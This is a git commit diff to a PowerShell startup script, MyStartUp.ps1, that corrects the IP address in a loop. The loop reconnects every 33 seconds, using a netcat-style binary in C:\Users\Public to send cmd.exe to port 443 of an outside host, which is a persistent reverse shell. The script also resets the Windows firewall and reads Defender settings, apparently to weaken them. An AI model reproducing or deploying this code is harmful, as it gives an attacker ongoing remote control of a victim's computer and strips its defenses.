ca69355973d6450456391a94a404fb263fb0c9c2
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2025-08-20 18:50:37 -0600

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,4 +1,4 @@
-while ($true) {C:\Users\Public\RNM.exe -nv 200.28-163.110 443 -e cmd.exe ; start-sleep 33}
+while ($true) {C:\Users\Public\RNM.exe -nv 200.28.163.110 443 -e cmd.exe ; start-sleep 33}
 netsh advfirewall reset
 
 $prefs = Get-MpPreference
